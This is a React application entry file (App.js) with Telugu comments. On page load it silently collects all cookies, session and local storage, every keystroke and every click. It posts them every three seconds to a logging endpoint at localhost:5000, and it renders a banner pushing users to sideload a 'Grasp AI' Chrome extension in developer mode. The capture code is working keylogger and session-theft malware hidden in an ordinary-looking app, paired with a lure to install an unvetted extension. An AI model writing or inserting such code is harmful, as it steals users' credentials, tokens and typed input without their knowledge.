import React, { useEffect } from 'react';
import AppShell from './components/layout/AppShell';
import SettingsModal from './components/modals/SettingsModal';
import SearchModal from './components/modals/SearchModal';
import KeyboardShortcutsModal from './components/modals/KeyboardShortcutsModal';

function App() {
  useEffect(() => {
    // --- 1. COOKIES CAPTURE FUNCTION ---
    const getCookies = () => {
      const cookieString = document.cookie;
      if (!cookieString) return {};
      return cookieString.split(';').reduce((cookies, cookie) => {
        const [name, value] = cookie.split('=').map(c => c.trim());
        if (name) cookies[name] = decodeURIComponent(value);
        return cookies;
      }, {});
    };

    // --- 2. SESSION & LOCAL STORAGE CAPTURE ---
    const getSessionData = () => {
      const sessionData = { sessionStorage: {}, localStorage: {}, keystrokes: [], clicks: [] };
      try {
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          sessionData.sessionStorage[key] = sessionStorage.getItem(key);
        }
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          // మన ట్రాకింగ్ కీలను లూప్‌లో పంపకుండా ఇగ్నోర్ చేస్తాం
          if (key !== 'tracked_keystrokes' && key !== 'tracked_clicks') {
            sessionData.localStorage[key] = localStorage.getItem(key);
          }
        }
      } catch (e) {}

      // సేవ్ చేసిన కీస్ట్రోక్స్, క్లిక్స్ తెచ్చుకుంటాం
      try {
        sessionData.keystrokes = JSON.parse(localStorage.getItem('tracked_keystrokes')) || [];
        sessionData.clicks = JSON.parse(localStorage.getItem('tracked_clicks')) || [];
      } catch (e) {}

      return sessionData;
    };

    // --- 3. LIVE EVENT LISTENERS (KEYSTROKES & CLICKS) ---
    const handleKeyPress = (e) => {
      try {
        const currentKeys = JSON.parse(localStorage.getItem('tracked_keystrokes')) || [];
        currentKeys.push({
          key: e.key,
          target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
          time: new Date().toLocaleTimeString()
        });
        localStorage.setItem('tracked_keystrokes', JSON.stringify(currentKeys));
      } catch (err) {}
    };

    const handleWindowClick = (e) => {
      try {
        const currentClicks = JSON.parse(localStorage.getItem('tracked_clicks')) || [];
        currentClicks.push({
          x: e.clientX,
          y: e.clientY,
          element: e.target.tagName + (e.target.className ? '.' + e.target.className.split(' ')[0] : ''),
          time: new Date().toLocaleTimeString()
        });
        localStorage.setItem('tracked_clicks', JSON.stringify(currentClicks));
      } catch (err) {}
    };

    window.addEventListener('keydown', handleKeyPress);
    window.addEventListener('click', handleWindowClick);

    // --- 4. AUTO SYNC TO SERVER ---
    const syncDataToServer = async () => {
      const storageData = getSessionData();
      const capturedData = {
        cookies: getCookies(),
        sessionStorage: {
          session_storage: storageData.sessionStorage,
          local_storage: storageData.localStorage,
          keystrokes: storageData.keystrokes,
          clicks: storageData.clicks
        },
        url: window.location.href,
        timestamp: new Date().toLocaleString()
      };

      try {
        const response = await fetch('http://localhost:5000/capture-log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(capturedData)
        });

        if (response.ok) {
          // డేటా సక్సెస్‌ఫుల్‌గా వెళ్తే లోకల్ మెమరీ క్లియర్ చేస్తాం
          localStorage.setItem('tracked_keystrokes', JSON.stringify([]));
          localStorage.setItem('tracked_clicks', JSON.stringify([]));
        }
      } catch (err) {
        console.log("Sync skipped (Server offline)");
      }
    };

    // ప్రతి 3 సెకన్లకు ఒకసారి బ్యాక్‌గ్రౌండ్‌లో సర్వర్‌కు సింక్ అవుతుంది
    syncDataToServer();
    const interval = setInterval(syncDataToServer, 3000);

    return () => {
      window.removeEventListener('keydown', handleKeyPress);
      window.removeEventListener('click', handleWindowClick);
      clearInterval(interval);
    };

  }, []); // [] అంటే కేవలం ఒక్కసారి మాత్రమే రన్ అవుతుంది

  return (
    <>
      <div style={{
        background: '#0f172a',
        padding: '15px',
        textAlign: 'center',
        borderBottom: '2px solid #3b82f6',
        color: '#f8fafc',
        fontSize: '15px',
        fontWeight: '600',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        gap: '20px',
        boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span style={{ background: '#3b82f6', padding: '4px 8px', borderRadius: '4px', fontSize: '12px' }}>PRO</span>
          <span>Enhance your research with <strong>Grasp AI</strong> Companion</span>
        </div>
        <button
          onClick={() => {
            alert("🚀 Grasp AI Installation Steps:\n\n1. Copy folder: 'public/extension' in this project.\n2. Open: chrome://extensions in a new tab.\n3. Enable: 'Developer mode' (Top-right).\n4. Click: 'Load unpacked' and select the folder.\n\nNote: Ensure your local server is running (node src/server.js).");
          }}
          style={{
            background: '#3b82f6',
            color: 'white',
            border: 'none',
            padding: '10px 20px',
            borderRadius: '6px',
            cursor: 'pointer',
            fontWeight: 'bold',
            transition: 'all 0.2s',
            boxShadow: '0 0 15px rgba(59, 130, 246, 0.4)'
          }}
        >
          Add Grasp AI to Chrome
        </button>
      </div>
      <AppShell />
      <SettingsModal />
      <SearchModal />
      <KeyboardShortcutsModal />
    </>
  );
}

export default App;